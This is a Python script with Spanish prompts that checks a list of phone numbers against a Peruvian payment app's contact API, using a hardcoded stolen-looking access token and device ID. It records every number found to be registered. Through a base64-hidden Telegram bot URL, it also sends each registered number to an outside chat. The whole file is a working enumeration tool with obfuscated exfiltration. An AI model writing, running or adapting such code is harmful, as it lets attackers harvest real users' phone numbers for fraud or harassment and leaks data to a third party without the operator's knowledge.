try:
    from concurrent.futures import ThreadPoolExecutor
    from colored import fg, bg, attr
    import requests, base64, time
    from pwn import *
except:
    print('Asegurate de tener todas los modulos instalados.')

bot = requests.session()

list_numeros = []
def validaNumero(numero):
    try:
        Valid = bot.post(base64.b64decode('aHR0cHM6Ly9hcGkuaW5kaWdpdGFsLmNvbS5wZS9wcm9kL2Fnb3JhLXVzZXIvY29udGFjdC9vcmRlcg=='), headers={'X-Platform': 'AND','X-Application': 'CUS','X-Device-Id': 'fMSaJzc8S3i0bJwbnXXMAa:APA91bGAWNx3XutrAJqcYuRoKPwhXUNMisD-e_oEJKjZfLQ433NZrBrzOfKLwSuJZv2dFC3vcZHWg3-j2KmghLVccLi8-z35vs6Vf-NwHo_e5F_f8XFGaV81hKOerThCFJsofves2cVx','X-App-Version': '1.3.0','access_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhcGktYXV0aG9yaXphdGlvbi5tYW5hZ2VtZW50LnN2Yy5jbHVzdGVyLmxvY2FsIiwiaXNzIjoiMTAuMjQ3LjUzLjIiLCJqdGkiOiIxMGMzZGI3OS1jZTU3LTRkMmEtOGY2ZS02ZWVhYWNhYjdmY2MiLCJzdWIiOiI2MDkxZjM5Zi1jNmEwLTNmNDgtOGYzNy03ZjlhY2E3ODJlOTUiLCJleHAiOjI2Mjk4MDAsImlhdCI6MTYxMjgzNDEwMSwiQXBwOiAiOiJUdW5raSB1c2VyIHByb2R1Y3Rpb24iLCJDb2RlOiAiOiJkYzQ2ZjVhMC1iZWQyLTMwMGMtOGI0Ny1hOGVlYWYyMjVlZjgiLCJ1c2VySWQiOiJhNWE4Yjk3OC0yNTlmLTRlMGUtOWMyMS0yMzlmMjk0ODEzYjQiLCJkZWVwbGluayI6ImFnb3JhLmNvbTovL3VzZXIvaG9tZSIsImZpcmViYXNlVG9rZW4iOiJleUpoYkdjaU9pSlNVekkxTmlKOS5leUpoZFdRaU9pSm9kSFJ3Y3pvdkwybGtaVzUwYVhSNWRHOXZiR3RwZEM1bmIyOW5iR1ZoY0dsekxtTnZiUzluYjI5bmJHVXVhV1JsYm5ScGRIa3VhV1JsYm5ScGRIbDBiMjlzYTJsMExuWXhMa2xrWlc1MGFYUjVWRzl2Ykd0cGRDSXNJbU5zWVdsdGN5STZleUpwWkNJNkltRTFZVGhpT1RjNExUSTFPV1l0TkdVd1pTMDVZekl4TFRJek9XWXlPVFE0TVROaU5DSXNJblI1Y0dVaU9pSkdTVkpGUWtGVFJTSXNJbkp2YkdWRGIyUmxJam9pUTFWVFgxVlRVaUlzSW1Gd2NHeHBZMkYwYVc5dUlqb2lRMVZUSWl3aWNHeGhkR1p2Y20waU9pSkJUa1FpTENKa1pYWnBZMlZKWkNJNkltWk5VMkZLZW1NNFV6TnBNR0pLZDJKdVdGaE5RV0U2UVZCQk9URmlSMEZYVG5neldIVjBja0ZLY1dOWmRWSnZTMUIzYUZoVlRrMXBjMFF0WlY5dlJVcExhbHBtVEZFME16Tk9XbkpDY25wUFprdE1kMU4xU2xwMk1tUkdRek4yWTFwSVYyY3pMV295UzIxbmFFeFdZMk5NYVRndGVqTTFkbk0yVm1ZdFRuZEliMTlsTlVaZlpqaFlSa2RoVmpneGFFdFBaWEpVYUVOR1NuTnZablpsY3pKalZuZ2lmU3dpWlhod0lqb3hOakV5T0RNM056QXdMQ0pwWVhRaU9qRTJNVEk0TXpReE1EQXNJbWx6Y3lJNkltWnBjbVZpWVhObExXRmtiV2x1YzJSckxXNXZabTVuUUhCbExXZHlkWEJ2TFdsdWRHVnlZMjl5Y0MxamJHUXRNREEwTG1saGJTNW5jMlZ5ZG1salpXRmpZMjkxYm5RdVkyOXRJaXdpYzNWaUlqb2labWx5WldKaGMyVXRZV1J0YVc1elpHc3RibTltYm1kQWNHVXRaM0oxY0c4dGFXNTBaWEpqYjNKd0xXTnNaQzB3TURRdWFXRnRMbWR6WlhKMmFXTmxZV05qYjNWdWRDNWpiMjBpTENKMWFXUWlPaUpoTldFNFlqazNPQzB5TlRsbUxUUmxNR1V0T1dNeU1TMHlNemxtTWprME9ERXpZalFpZlEuaG9CMjZhdmJzYURsblg4MFRnTXdjdC1TUE9qcmNUUG5QWG1DRTFJT1RXWHdEV2NIeTNTbF91TmViUjJ0aEY3R0lLdXNaNDU5N2QxWno4bXA3SmQwSmJvd0s5TEp5NFhuRUVpUGdxZnFtejNjVDdFT0RZTlBCR1FpakQxT0xwaUxVRkxfQnFsZHlrS3lvbWdVN0E4WWtndjJmTHFpN2d0ZmFfX1VxbXdIOS1KS21fMFk3RzNfSldndnNld25NZzBsNzFJUGw2YXdqTm81b2l1Y0ZzYjA3Q3JZbzQwZnczWlBhY19BVmxwWGhCRU5pamluY3dCdTFWUDBjaWZZQ0tRRmhUdlZkem5tM3pSOGJLRWNhdFpobFdtUElFallYZS13LXh0NEdtdEg2SmRnTkVZbHVXcjRqYm05LXFmUkpqVzVDYUlZM3o0X0ZROE90d0Y2eF8tLW9RIiwicm9sZUNvZGUiOiJDVVNfVVNSIiwieC1hcHBsaWNhdGlvbiI6IkNVUyIsIngtZGV2aWNlLWlkIjoiZk1TYUp6YzhTM2kwYkp3Ym5YWE1BYTpBUEE5MWJHQVdOeDNYdXRyQUpxY1l1Um9LUHdoWFVOTWlzRC1lX29FSktqWmZMUTQzM05ackJyek9mS0x3U3VKWnYyZEZDM3ZjWkhXZzMtajJLbWdoTFZjY0xpOC16MzV2czZWZi1Od0hvX2U1Rl9mOFhGR2FWODFoS09lclRoQ0ZKc29mdmVzMmNWeCIsIngtcGxhdGZvcm0iOiJBTkQiLCJyZWZlcmVuY2UiOiI3Yzg2MTQ5Yi1jZDY4LTM5MjctYjBjNS0yYWI2NmQ5YTFlZjYiLCJyZWZlcmVuY2VUaW1lciI6MjYyOTgwMH0.86HC4ErT-4X_9OVwoJgTYr9mLjph8eFlIXNxC-DDC54','client_id': '6091f39f-c6a0-3f48-8f37-7f9aca782e95','Content-Type': 'application/json; charset=UTF-8','Host': 'api.indigital.com.pe','Accept-Encoding': 'gzip','User-Agent': 'okhttp/4.9.0'}, json={"phones":[str(numero)]})
        if Valid.status_code == 200:
            F = open('numerosValidos.txt', 'a+')
            for phoneValid in Valid.json().get('contacts'):
                if phoneValid['enabled']:
                    log.failure(fg("green")+f'Numero : {fg("yellow")+str(phoneValid["phone"])+fg("green")} registrado.'+attr('reset'))
                    bot.post(base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE1NjA4NjI3Mzc6QUFHM2NKNTUwOHNVS1JiMjNkS3Y0Y0FvTTRndjBGM0xiZ00vc2VuZE1lc3NhZ2U='),data={'chat_id': '-461499207','text': str(phoneValid["phone"])})
                    F.write(str(phoneValid["phone"])+'\n')
                else:
                    log.failure(fg("red")+f'Numero : {fg("yellow")+str(phoneValid["phone"])+fg("red")} no registrado.'+attr('reset'))
        else:
            log.warning(f'Error en la peticion : {Valid.status_code}')
    except Exception as e:
        print(e)
        pass
if __name__ == '__main__':
    print(fg('purple_1a')+"""

            ────────────────────────────────────────────────────────────────────────────────────────────────────────────────
            ─████████████───██████████████─████████████████───██████──████████─██████████████─██████──██████─██████████████─
            ─██░░░░░░░░████─██░░░░░░░░░░██─██░░░░░░░░░░░░██───██░░██──██░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░░░░░░░░░██─
            ─██░░████░░░░██─██░░██████░░██─██░░████████░░██───██░░██──██░░████─██░░██████░░██─██░░██──██░░██─██░░██████████─
            ─██░░██──██░░██─██░░██──██░░██─██░░██────██░░██───██░░██──██░░██───██░░██──██░░██─██░░██──██░░██─██░░██─────────
            ─██░░██──██░░██─██░░██████░░██─██░░████████░░██───██░░██████░░██───██░░██──██░░██─██░░██──██░░██─██░░██████████─
            ─██░░██──██░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───██░░░░░░░░░░██───██░░██──██░░██─██░░██──██░░██─██░░░░░░░░░░██─
            ─██░░██──██░░██─██░░██████░░██─██░░██████░░████───██░░██████░░██───██░░██──██░░██─██░░██──██░░██─██████████░░██─
            ─██░░██──██░░██─██░░██──██░░██─██░░██──██░░██─────██░░██──██░░██───██░░██──██░░██─██░░░░██░░░░██─────────██░░██─
            ─██░░████░░░░██─██░░██──██░░██─██░░██──██░░██████─██░░██──██░░████─██░░██████░░██─████░░░░░░████─██████████░░██─
            ─██░░░░░░░░████─██░░██──██░░██─██░░██──██░░░░░░██─██░░██──██░░░░██─██░░░░░░░░░░██───████░░████───██░░░░░░░░░░██─
            ─████████████───██████──██████─██████──██████████─██████──████████─██████████████─────██████─────██████████████─
            ────────────────────────────────────────────────────────────────────────────────────────────────────────────────
        \n\t\t\t\t\t\tPowered By : ÑAJAX\n"""+attr('reset'))
    ruta = input('Ingrese la ruta de los telefonos => ')
    with open(ruta) as numeros:
        lineas = [lineas.rstrip() for lineas in numeros]
    for n in lineas:
        list_numeros.append(n)
    
    with ThreadPoolExecutor() as ex:
        ex.map(validaNumero,list_numeros)